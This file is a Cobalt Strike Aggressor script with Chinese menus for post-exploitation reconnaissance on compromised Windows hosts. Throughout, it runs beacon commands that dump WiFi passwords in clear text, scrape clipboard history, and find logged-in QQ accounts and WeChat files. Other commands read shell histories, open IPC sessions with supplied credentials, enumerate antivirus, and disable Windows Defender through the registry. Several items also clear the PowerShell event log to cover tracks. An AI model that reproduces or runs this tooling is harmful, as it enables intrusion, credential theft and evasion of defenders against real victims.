menu "信息收集" {
	menu "系统信息" {
		item "简要查看系统信息" {
			blog($1, "-------------------------------------------------------------简要查看系统信息-------------------------------------------------------------");
			bshell($1, "net config workstation");	
		}
		item "查看安装的补丁" {
			blog($1, "-------------------------------------------------------------获取安装的补丁-------------------------------------------------------------");
			bshell($1, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
		}
		item "查看安装程序和版本信息" {
			blog($1, "-------------------------------------------------------------获取安装程序和版本信息-------------------------------------------------------------");
			bshell($1, "wmic product list brief");
		}
		item "查看环境变量" {
			blog($1, "-------------------------------------------------------------查看系统环境变量--------------------------------------------------------");
			bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-EnvironmentalVariables");
			bshell($1, "set");
		}
		item "查看所有的盘符" {
			blog($1, "-------------------------------------------------------------查看所有的盘符-------------------------------------------------------------");
			bshell($1, "fsutil fsinfo drives");	
		}
	}
	menu "网络信息" {
		item "查看IP配置"{
			blog($1, "-------------------------------------------------------------查看IP配置-------------------------------------------------------------");
			bshell($1, "ipconfig /all");
		}
		item "查看路由信息"{
			blog($1, "-------------------------------------------------------------查看路由信息-------------------------------------------------------------");
			bshell($1, "route print");
		}
		item "查看arp缓存"{
			blog($1, "-------------------------------------------------------------查看arp缓存-------------------------------------------------------------");
			bshell($1, "arp -a");
		}
		item "查看hosts文件"{
			blog($1, "-------------------------------------------------------------查看hosts文件-------------------------------------------------------------");
			bshell($1, "type C:\\Windows\\System32\\drivers\\etc\\hosts");
		}
		item "查看DNS缓存"{
			blog($1, "-------------------------------------------------------------查看DNS缓存-------------------------------------------------------------");
			bshell($1, "ipconfig /displaydns");
		}
		item "tracert路由跟踪"{
			blog($1, "-------------------------------------------------------------tracert路由跟踪-------------------------------------------------------------");
			prompt_text("需要跟踪的ip或域名？", "", lambda({ bshell(@ids, "tracert $1");  }, @ids => $1));
		}
	}
	menu "端口&&服务&进程" {
		item "查看端口连接"{
			blog($1, "-------------------------------------------------------------查看端口连接-------------------------------------------------------------");
			bshell($1, "netstat -ano");
		}
		item "查看指定端口连接状态" {
			blog($1, "-------------------------------------------------------------查看指定端口连接状态-------------------------------------------------------------");
			prompt_text("需要查询的端口?", "", lambda({ bshell(@ids, "netstat -ano | findstr $1");  }, @ids => $1));
		}
		item "获取服务信息" {
			blog($1, "-------------------------------------------------------------获取服务信息-------------------------------------------------------------");
			bshell($1, "net start");
		}
		item "获取服务详细信息" {
			blog($1, "-------------------------------------------------------------获取服务详细信息-------------------------------------------------------------");
			bshell($1, "wmic service list brief");
		}
		item "获取进程信息" {
			blog($1, "-------------------------------------------------------------获取进程信息-------------------------------------------------------------");
			bshell($1, "tasklist /svc");
		}
		item "获取进程详细信息" {
			blog($1, "-------------------------------------------------------------获取进程详细信息-------------------------------------------------------------");
			bshell($1, "wmic process get caption,commandline,processid /value");
		}
		item "查询指定进程" {
			blog($1, "-------------------------------------------------------------查询指定进程-------------------------------------------------------------");
			prompt_text("需要查询的进程名?", "", lambda({ bshell(@ids, "tasklist | findstr $1");  }, @ids => $1));
		}
		item "查看指定端口对应的进程" {
			blog($1, "-------------------------------------------------------------查看指定端口对应的进程-------------------------------------------------------------");
			$bid = $1;
			$dialog = dialog("查看指定端口对应的进程", %(bid => $bid), &Get_Port_Process);
			dialog_description($dialog, "请输入要查询的端口号？");
			drow_text($dialog, "port",  "端口: ");
		    dbutton_action($dialog, "确定");
		    dialog_show($dialog);
		}
		sub Get_Port_Process{
			bpowershell_import($bid, script_resource("/powershell/Get_Port_Process.ps1"));
			bpowerpick($bid,"Get_Port_Process $3['port']");
            bshell($bid,"wevtutil cl \"Windows PowerShell\"");
		}
		item "kill指定PID的进程" {
			blog($1, "-------------------------------------------------------------kill指定PID的进程-------------------------------------------------------------");
			prompt_text("需要Kill的PID?", "", lambda({ bshell(@ids, "taskkill /F -pid $1");  }, @ids => $1));
		}
		item "kill指定程序的进程" {
			blog($1, "-------------------------------------------------------------kill指定程序的进程-------------------------------------------------------------");
			prompt_text("需要Kill的程序名?", "", lambda({ bshell(@ids, "taskkill /f /t /im $1");  }, @ids => $1));
		}

	}
	menu "共享信息" {
		item "查看本机开启的共享" {
			blog($1, "-------------------------------------------------------------查看开启的共享-------------------------------------------------------------");
			bshell($1, "net share");
		}
		item "查看指定主机开启的共享" {
			blog($1, "-------------------------------------------------------------关闭指定共享-------------------------------------------------------------");
			prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net view \\\\$1");  }, @ids => $1));
		}
		item "查看连接(本机连接其他机器)" {
			blog($1, "-------------------------------------------------------------查看连接(本机连接其他机器)-------------------------------------------------------------");
			bshell($1, "net use");
		}
		item "查看连接(其他机器连接本机)" {
			blog($1, "-------------------------------------------------------------查看连接(其他机器连接本机)------------------------------------------------------------");
			bshell($1, "net session");
		}
		item "开启指定共享" {
			blog($1, "-------------------------------------------------------------开启指定共享-------------------------------------------------------------");
			prompt_text("需要开启的共享名?", "", lambda({ bshell(@ids, "net share $1");  }, @ids => $1));
		}
		item "关闭指定共享" {
			blog($1, "-------------------------------------------------------------关闭指定共享-------------------------------------------------------------");
			prompt_text("需要关闭的共享名?", "", lambda({ bshell(@ids, "net share $1 /del");  }, @ids => $1));
		}
		item "与指定主机建立IPC连接" {
			$bid = $1['@'];
			$dialog = dialog("与指定主机建立IPC连接", %(bid => $bid), &net_ipc);
			dialog_description($dialog, "此功能与指定主机建立IPC连接");
			drow_text($dialog, "ip", "目标主机IP:  ");
			drow_text($dialog, "username", "用户名:  ");
			drow_text($dialog, "password", "密码:  ");
			dbutton_action($dialog, "确定");
			dialog_show($dialog);
		}
		sub net_ipc {
			blog($1, "-------------------------------------------------------------与指定主机建立IPC连接-------------------------------------------------------------");
			bshell($bid, "net use \\\\$3['ip'] /u:$3['username'] $3['password']");
		}
		item "删除与指定主机建立的IPC连接" {
			blog($1, "-------------------------------------------------------------删除与目标ip建立的IPC连接-------------------------------------------------------------");
			prompt_text("目标主机IP?", "", lambda({ bshell(@ids, "net use \\\\$1 /del");  }, @ids => $1));
		}
	}
	menu "WIFI信息" {
		item "查看无线接口" {
			blog($1, "-------------------------------------------------------------查看无线接口-------------------------------------------------------------");
			bshell($1, "netsh wlan show interface");
		}
		item "获取连接过的wifi" {
			blog($1, "-------------------------------------------------------------获取连接过的wifi-------------------------------------------------------------");
			bshell($1, "netsh wlan show profiles");
		}
		item "获取Wifi密码" {
			blog($1, "-------------------------------------------------------------获取Wifi密码-------------------------------------------------------------");
			prompt_text("wifi名?", "", lambda({ bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");  }, @ids => $1));
		}
	}
	menu "剪贴板信息(只支持win10)" {
		item "判断目标主机剪贴板是否有东西" {
			blog($1, "-------------------------------------------------------------判断目标主机剪贴板是否有东西-------------------------------------------------------------");
			bexecute_assembly($1, script_resource('/exe/SharpClipHistory.exe'), "--checkOnly");
		}
		item "开启获取剪贴板功能" {
			blog($1, "-------------------------------------------------------------开启获取剪贴板功能-------------------------------------------------------------");
			bexecute_assembly($1, script_resource('/exe/SharpClipHistory.exe'), "--enableHistory");
		}
		item "获取剪贴板上的图片" {
			blog($1, "-------------------------------------------------------------获取剪贴板上的图片-------------------------------------------------------------");
			blog($1, "如果目标主机剪贴板上有图片，那么该功能会将剪贴板上的图片保存为 C:\\Users\\xx\\AppData\\Local\\Packages\\xx.bmp文件");
			bexecute_assembly($1, script_resource('/exe/SharpClipHistory.exe'), "--saveImages");
		}
		item "获取剪贴板上的信息" {
			blog($1, "-------------------------------------------------------------获取剪贴板上的信息-------------------------------------------------------------");
			bexecute_assembly($1, script_resource('/exe/SharpClipHistory.exe'));
		}
	}
	item "查看微信接收文件目录"{
		blog($1, "-------------------------------------------------------------查看微信接收文件目录-------------------------------------------------------------");
		bshell($1,"dir /s /b c:\\\"WeChat Files\"");
	}
	item "判断是否是VM虚拟机" {
		blog($1, "-------------------------------------------------------------判断是否是VM虚拟机-------------------------------------------------------------");
		local('$bid');
        foreach $bid ($1){
            bpowershell_import($bid, script_resource("/powershell/Check-VM.ps1"));
            bpowerpick($bid,"Check-VM");
            bshell($bid,"wevtutil cl \"Windows PowerShell\"");
        }
	}
	item "查看启动项" { 
		blog($1, "-------------------------------------------------------------查看启动项-------------------------------------------------------------");
		bshell($1, "wmic startup get command,caption");
	}
	item "查看目标主机的杀软" {
		blog($1, "-------------------------------------------------------------查看目标主机的杀软--------------------------------------------------------");
		bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-AvProcessEDRproduct");
	}
	item "查看Defender配置" {
		blog($1, "-------------------------------------------------------------查看Defender配置--------------------------------------------------------");
		bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-Defender");	
	}
	item "组策略关闭Defender" {
		blog($1, "-------------------------------------------------------------组策略关闭defender--------------------------------------------------------");
		bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
	}
	item "查看回收站" {
		blog($1, "-------------------------------------------------------------查看回收站--------------------------------------------------------");
		bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-GetRecycle");
	}
	item "查看安装的.NET版本" {
		blog($1, "-------------------------------------------------------------查看安装的.NET版本--------------------------------------------------------");
		bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-CsharpVersion");	
	}
	item "获取登录的QQ账号" {
		blog($1, "-------------------------------------------------------------获取登录的QQ账号-------------------------------------------------------------");
		bshell($1, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
	}
	item "获取cmd历史命令" {
		blog($1, "-------------------------------------------------------------获取cmd历史命令-------------------------------------------------------------");
		bshell($1, "doskey /history");
	}
	item "获取powershell历史命令" {
		blog($1, "-------------------------------------------------------------获取powershell历史命令-------------------------------------------------------------");
		bshell($1, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
	}
	item "获取文件浏览历史记录" {
		blog($1, "-------------------------------------------------------------获取文件浏览历史记录-------------------------------------------------------------");
		bshell($1, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
	}
	item "获取SMB指向路径" {
		blog($1, "-------------------------------------------------------------获取SMB指向路径-------------------------------------------------------------");
		bshell($1, "wmic share get name,path");
	}
}